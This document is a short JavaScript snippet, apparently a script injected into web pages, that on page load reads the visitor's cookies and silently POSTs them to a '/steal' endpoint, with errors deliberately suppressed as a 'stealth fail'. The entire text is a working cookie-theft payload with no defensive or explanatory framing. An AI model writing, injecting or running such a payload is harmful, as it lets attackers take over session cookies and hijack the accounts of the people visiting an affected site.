window.onload = function () {
  try {
    let cookies = document.cookie || "NO_COOKIES_FOUND";
    fetch("/steal", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "cookie=" + encodeURIComponent(cookies)
    });
  } catch (e) {
    // Do nothing - stealth fail
  }
};
